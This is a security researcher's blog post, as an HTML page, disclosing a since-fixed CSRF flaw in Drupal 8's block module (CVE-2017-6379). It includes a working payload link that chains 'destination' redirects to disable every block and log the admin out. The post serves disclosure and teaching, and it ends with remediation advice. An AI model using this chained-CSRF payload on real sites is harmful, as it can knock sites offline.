<!DOCTYPE html>
<html lang="en" dir="ltr" prefix="og: https://ogp.me/ns#">
  <head>
    <meta charset="utf-8" />
<meta name="description" content="Note: The exploit discussed in this post was never included in a stable core release, so don’t freak out! The Drupal security team quickly fixed this while 8.3.x was still in development. One method I commonly use when auditing Drupal 8 code is to find routes that are accessible to anonymous users, or that check permissions which are commonly assigned to authenticated users. The purpose of this kind of audit is to find an access bypass vulnerability, or a route that is otherwise an easy target for denial of service or remote code execution attacks." />
<link rel="canonical" href="https://mortenson.coffee/blog/chained-drupal-csrf-disable-all-blocks" />
<meta property="og:site_name" content="Samuel Mortenson" />
<meta property="og:url" content="https://mortenson.coffee/blog/chained-drupal-csrf-disable-all-blocks" />
<meta property="og:title" content="Chained Drupal CSRF to disable all blocks" />
<meta property="og:description" content="Note: The exploit discussed in this post was never included in a stable core release, so don’t freak out! The Drupal security team quickly fixed this while 8.3.x was still in development. One method I commonly use when auditing Drupal 8 code is to find routes that are accessible to anonymous users, or that check permissions which are commonly assigned to authenticated users. The purpose of this kind of audit is to find an access bypass vulnerability, or a route that is otherwise an easy target for denial of service or remote code execution attacks." />
<meta property="article:tag" content="drupal" />
<meta property="article:tag" content="security" />
<meta property="article:published_time" content="2017-01-09T15:59:17+00:00" />
<meta property="article:modified_time" content="2020-01-27T17:48:05+00:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:site" content="@mortensonsam" />
<meta name="twitter:title" content="Chained Drupal CSRF to disable all blocks" />
<meta name="twitter:creator" content="@mortensonsam" />
<meta name="Generator" content="Drupal 11 (https://www.drupal.org)" />
<meta name="MobileOptimized" content="width" />
<meta name="HandheldFriendly" content="true" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<link rel="icon" href="/themes/custom/mortenson/favicon.png" type="image/png" />

    <link rel="alternate" type="application/rss+xml" title="RSS Feed" href="https://mortenson.coffee/feed.xml" />
    <title>Chained Drupal CSRF to disable all blocks | Samuel Mortenson</title>
    <link rel="stylesheet" media="all" href="/sites/default/files/css/css_dNf6ixgnAGkM8UD36N67DMr8R5YkiMNWaKojV_EaKdc.css?delta=0&amp;language=en&amp;theme=mortenson&amp;include=eJx1ijEOwCAMxD6EypMQ0IMgkQSRLP19u7cdvNi2yxwcSzYE1u0QU4mchwRrNVblpQLxg2tqqo4daHSaD75o_Zxlak8-fOK7vS0hn9g3di83Mg" />
<link rel="stylesheet" media="all" href="/sites/default/files/css/css_4t6L0ZinRMWc-2oNbBS4K5uOIzk-9q_-ItwMFAnr3Qs.css?delta=1&amp;language=en&amp;theme=mortenson&amp;include=eJx1ijEOwCAMxD6EypMQ0IMgkQSRLP19u7cdvNi2yxwcSzYE1u0QU4mchwRrNVblpQLxg2tqqo4daHSaD75o_Zxlak8-fOK7vS0hn9g3di83Mg" />

    
  </head>
  <body>
    <a href="#main-content" class="visually-hidden focusable">
      Skip to main content
    </a>
    
      <div class="dialog-off-canvas-main-canvas" data-off-canvas-main-canvas>
      <header class="mc-header container ">
          <a href="/blog" class="mc-header__back">Back to blog</a>
              <a href="/" class="mc-header__name">
            Samuel<br />Mortenson
          </a>
          </header><main id="main-content">
    <div>
    <div data-drupal-messages-fallback class="hidden"></div>  <article class="mc-blog container container--margin" role="article">
        <div class="mc-blog-title container">
    <div class="mc-blog-title__bg"></div>
    <h1 class="mc-blog-title__title">Chained Drupal CSRF to disable all blocks</h1>
  </div>    <div class="mc-blog__byline">
      Jan 9th, 2017
    </div>
    <div class="mc-blog__text">
      
            <div><p><em>Note: The exploit discussed in this post was never included in a stable core release, so don’t freak out! The Drupal security team quickly fixed this while 8.3.x was still in development.</em></p>
<p>One method I commonly use when auditing Drupal 8 code is to find routes that are accessible to anonymous users, or that check permissions which are commonly assigned to authenticated users. The purpose of this kind of audit is to find an access bypass vulnerability, or a route that is otherwise an easy target for denial of service or remote code execution attacks.</p>
<p>While this research can lead to interesting finds, I’ve found that the code triggered by anonymous routes is usually strongly protected, which makes exploiting publicly accessible routes difficult.</p>
<p>Recently I’ve started focusing on admin routes, which given their stronger access checking are written with the assumption that an admin user does not want to compromise their own site. That assumption is valid, but admin routes will always be vulnerable to two types of attacks by unprivileged users: cross site scripting (XSS), and cross site request forgery (CSRF).</p>
<p>In this post, I’ll go over the specific exploit fixed in&nbsp;<a href="https://www.drupal.org/SA-2017-001">SA-2017-001</a>&nbsp;/&nbsp;<a href="http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-6379">CVE-2017-6379</a>, a CSRF vulnerability in the block module which could be used to disable every block on a site, potentially leaving it inoperable. Fun times!</p>
<p>In Drupal, CSRF targets are usually GET routes that perform an administrative action without confirmation. These routes mostly exist so that you can simply link to a simple action instead of redirecting or embedding an entire form. To protect these dangerous GET routes, Drupal requires that a “token” query parameter is present in the request, which validates that the link was generated by the host site for the correct user session.</p>
<p>Of course, not all routes are implicitly protected with a CSRF token. Developers have to explicitly add it to the route definition. For example:</p>
<figure>
<pre>
<code data-lang="yaml" class=" hljs yaml"><span class="hljs-attr">system.run_cron:</span>
  <span class="hljs-attr">path:</span> <span class="hljs-string">'/admin/reports/status/run-cron'</span>
  <span class="hljs-attr">defaults:</span>
    <span class="hljs-attr">_controller:</span> <span class="hljs-string">'\Drupal\system\CronController::runManually'</span>
  <span class="hljs-attr">options:</span>
    <span class="hljs-attr">no_cache:</span> <span class="hljs-literal">TRUE</span>
  <span class="hljs-attr">requirements:</span>
    <span class="hljs-attr">_permission:</span> <span class="hljs-string">'administer site configuration'</span>
    <span class="hljs-attr">_csrf_token:</span> <span class="hljs-string">'TRUE'</span></code></pre></figure>
<p>That "_csrf_token" requirement makes sure that all URLs generated for that route include a valid “token” query parameter.</p>
<p>Knowing all this, I started poking around the admin interface, looking for unprotected links. Eventually, I found that the enable/disable links for blocks at /admin/structure/block did not have a token present, which meant that they were vulnerable to CSRF! An example link to disable a block is "admin/structure/block/manage/bartik_content/disable".</p>
<p>Once you’re aware of a route vulnerable to CSRF, there are two common ways of delivering the payload - either as a link, or as the source in an img tag, which could be present in an email or another site.</p>
<p>This was an interesting find, but I wanted to find a better example exploit. After some tweaking, I realized that I could chain the URLs together with the “destination” query parameter, which allows local redirects in Drupal. Now instead of disabling one block per request, I can send one request that disables all blocks in all enabled themes! Here’s an example payload:</p>
<figure>
<pre>
<code data-lang="html" class=" hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"http://example.com/admin/structure/block/manage/bartik_account_menu/disable
?destination=/admin/structure/block/manage/bartik_branding/disable
?destination=/admin/structure/block/manage/bartik_breadcrumbs/disable
?destination=/admin/structure/block/manage/bartik_content/disable
?destination=/admin/structure/block/manage/bartik_footer/disable
?destination=/admin/structure/block/manage/bartik_help/disable
?destination=/admin/structure/block/manage/bartik_local_actions/disable
?destination=/admin/structure/block/manage/bartik_local_tasks/disable
?destination=/admin/structure/block/manage/bartik_main_menu/disable
?destination=/admin/structure/block/manage/bartik_messages/disable
?destination=/admin/structure/block/manage/bartik_page_title/disable
?destination=/admin/structure/block/manage/bartik_powered/disable
?destination=/admin/structure/block/manage/bartik_search/disable
?destination=/admin/structure/block/manage/bartik_tools/disable
?destination=/admin/structure/block/manage/seven_breadcrumbs/disable
?destination=/admin/structure/block/manage/seven_content/disable
?destination=/admin/structure/block/manage/seven_help/disable
?destination=/admin/structure/block/manage/seven_local_actions/disable
?destination=/admin/structure/block/manage/seven_login/disable
?destination=/admin/structure/block/manage/seven_messages/disable
?destination=/admin/structure/block/manage/seven_page_title/disable
?destination=/admin/structure/block/manage/seven_primary_local_tasks/disable
?destination=/admin/structure/block/manage/seven_secondary_local_tasks/disable
?destination=/user/logout"</span>&gt;</span>
  Click me admin!
<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></code></pre></figure>
<p><em>(newlines added for readability)</em></p>
<p>While your browser will eventually give up on following the redirects, Drupal will process them all, disabling all blocks on your site. This method of chained CSRF can be used to exploit multiple routes with one request. I threw in a “/user/logout” at the end for a little extra fun and confusion.</p>
<p>I reported this to the Drupal security team, who acted quickly to commit and release the fix. This sort of thing is easy to fix, and equally easy to overlook. If you provide a route that does something dangerous via GET, make sure you add the "csrf_token" requirement!</p>
</div>
      
    </div>
  </article>

  </div>

</main>
  <footer class="mc-footer container">
    <ul class="mc-footer__menu">
      <li><a href="/search">Search</a></li>
      <li><a href="/blog">Blog</a></li>
      <li><a href="/work">Work</a></li>
      <li><a href="/gallery">Gallery</a></li>
      <li><a href="mailto:sam@snippetsolver.com">Contact</a></li>
    </ul>
    <div class="mc-footer__copyright">©2025 Samuel Mortenson</div>
    <a class="mc-footer__rss" href="/feed.xml">
      <span class="visually-hidden">RSS Feed</span>
      <img alt="RSS feed icon" src="/core/misc/feed.svg" />
    </a>
  </footer>
  </div>

    
    
  </body>
</html>
